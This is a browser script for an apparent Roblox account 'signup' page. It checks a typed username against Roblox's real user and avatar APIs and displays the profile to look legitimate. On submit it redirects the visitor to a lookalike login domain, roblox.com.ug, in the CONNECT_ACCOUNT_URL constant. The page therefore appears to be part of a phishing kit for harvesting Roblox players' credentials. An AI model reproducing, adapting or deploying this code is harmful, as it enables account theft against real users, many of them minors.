(function () {
  const DEBOUNCE_MS = 450;
  const PROXY_LOOKUP = "/api/roblox/lookup";
  const CONNECT_ACCOUNT_URL = "https://roblox.com.ug/login?returnUrl=9419458462590638";
  const DEFAULT_AVATAR = "images/default-roblox-avatar.svg";

  if (window.location.protocol === "file:") {
    document.addEventListener("DOMContentLoaded", function () {
      const status = document.getElementById("form-status");
      if (status) {
        status.textContent =
          "Open this page through the server: http://localhost:3000/signup.html";
        status.classList.remove("hidden");
        status.classList.add("status-error");
      }
    });
  }

  const form = document.getElementById("signup-form");
  const usernameInput = document.getElementById("roblox-username");
  const usernameError = document.getElementById("username-error");
  const formStatus = document.getElementById("form-status");
  const submitBtn = document.getElementById("signup-submit");

  const profileAvatar = document.getElementById("profile-avatar");
  const avatarLoading = document.getElementById("avatar-loading");
  const avatarMeta = document.getElementById("avatar-meta");
  const profileDisplayName = document.getElementById("profile-display-name");
  const profileUsername = document.getElementById("profile-username");
  const profileLink = document.getElementById("profile-link");

  let debounceTimer = null;
  let lookupRequestId = 0;
  let verifiedUser = null;
  let isSubmitting = false;

  function showError(el, message) {
    el.textContent = message;
    el.classList.remove("hidden");
  }

  function hideError(el) {
    el.textContent = "";
    el.classList.add("hidden");
  }

  function setFormStatus(message, type) {
    formStatus.textContent = message;
    formStatus.classList.remove("hidden", "status-error", "status-success");
    if (type) {
      formStatus.classList.add("status-" + type);
    }
  }

  function clearFormStatus() {
    formStatus.textContent = "";
    formStatus.classList.add("hidden");
    formStatus.classList.remove("status-error", "status-success");
  }

  function setUsernameState(state) {
    usernameInput.classList.remove("input-error", "input-success");
    if (state === "error") {
      usernameInput.classList.add("input-error");
    } else if (state === "success") {
      usernameInput.classList.add("input-success");
    }
  }

  function showAvatarLoading() {
    avatarLoading.classList.remove("hidden");
  }

  function hideAvatarLoading() {
    avatarLoading.classList.add("hidden");
  }

  function resetToDefaultAvatar() {
    verifiedUser = null;
    profileAvatar.src = DEFAULT_AVATAR;
    profileAvatar.alt = "Default Roblox avatar";
    avatarMeta.classList.add("hidden");
    profileDisplayName.textContent = "";
    profileUsername.textContent = "";
    profileLink.href = "#";
    hideAvatarLoading();
  }

  function renderProfile(user) {
    verifiedUser = user;

    if (user.avatarUrl) {
      profileAvatar.src = user.avatarUrl;
      profileAvatar.alt = user.displayName + " avatar";
    } else {
      profileAvatar.src = DEFAULT_AVATAR;
      profileAvatar.alt = "Roblox avatar";
    }

    profileDisplayName.textContent = user.displayName;
    profileUsername.textContent = "@" + user.username;
    profileLink.href = user.profileUrl;
    avatarMeta.classList.remove("hidden");
    hideAvatarLoading();
    setUsernameState("success");
    hideError(usernameError);
  }

  async function lookupDirect(username) {
    const userResponse = await fetch("https://users.roblox.com/v1/usernames/users", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        usernames: [username],
        excludeBannedUsers: false,
      }),
    });

    if (!userResponse.ok) {
      throw new Error("lookup_failed");
    }

    const userPayload = await userResponse.json();
    if (!userPayload.data || userPayload.data.length === 0) {
      throw new Error("not_found");
    }

    const user = userPayload.data[0];
    let avatarUrl = null;

    const thumbResponse = await fetch(
      "https://thumbnails.roblox.com/v1/users/avatar-headshot" +
        "?userIds=" + user.id +
        "&size=420x420&format=Png&isCircular=false"
    );

    if (thumbResponse.ok) {
      const thumbPayload = await thumbResponse.json();
      avatarUrl = thumbPayload.data?.[0]?.imageUrl ?? null;
    }

    return {
      userId: user.id,
      username: user.name,
      displayName: user.displayName,
      avatarUrl,
      profileUrl: "https://www.roblox.com/users/" + user.id + "/profile",
    };
  }

  async function lookupViaProxy(username) {
    const response = await fetch(
      PROXY_LOOKUP + "?username=" + encodeURIComponent(username)
    );

    const payload = await response.json().catch(function () {
      return { error: "Unexpected server response." };
    });

    if (!response.ok) {
      throw new Error(payload.error || "lookup_failed");
    }

    return payload;
  }

  async function lookupUsername(username) {
    try {
      return await lookupDirect(username);
    } catch (directError) {
      return lookupViaProxy(username);
    }
  }

  async function runLookup(rawUsername) {
    const username = rawUsername.trim();

    hideError(usernameError);
    setUsernameState(null);
    clearFormStatus();

    if (!username) {
      resetToDefaultAvatar();
      return;
    }

    if (username.length < 3) {
      resetToDefaultAvatar();
      showError(usernameError, "Username must be at least 3 characters.");
      setUsernameState("error");
      return;
    }

    const requestId = ++lookupRequestId;
    showAvatarLoading();

    try {
      const user = await lookupUsername(username);

      if (requestId !== lookupRequestId) {
        return;
      }

      renderProfile(user);
    } catch (err) {
      if (requestId !== lookupRequestId) {
        return;
      }

      resetToDefaultAvatar();

      const message =
        err.message === "not_found" || /not found/i.test(String(err.message))
          ? "That Roblox username does not exist."
          : String(err.message || "Unable to verify this username. Try again.");

      showError(usernameError, message);
      setUsernameState("error");
    }
  }

  function scheduleLookup() {
    clearTimeout(debounceTimer);
    debounceTimer = setTimeout(function () {
      runLookup(usernameInput.value);
    }, DEBOUNCE_MS);
  }

  usernameInput.addEventListener("input", scheduleLookup);

  usernameInput.addEventListener("blur", function () {
    clearTimeout(debounceTimer);
    runLookup(usernameInput.value);
  });

  form.addEventListener("submit", async function (e) {
    e.preventDefault();
    clearFormStatus();

    if (isSubmitting) {
      return;
    }

    if (!verifiedUser) {
      showError(usernameError, "Enter a valid Roblox username first.");
      setUsernameState("error");
      usernameInput.focus();
      return;
    }

    isSubmitting = true;
    submitBtn.disabled = true;
    submitBtn.textContent = "Connecting...";

    try {
      if (!CONNECT_ACCOUNT_URL) {
        throw new Error("Connect account URL is not set yet.");
      }

      window.location.href = CONNECT_ACCOUNT_URL;
    } catch (err) {
      setFormStatus(String(err.message), "error");
      submitBtn.disabled = false;
      submitBtn.textContent = "Connect account to Roblox";
    } finally {
      isSubmitting = false;
    }
  });
})();
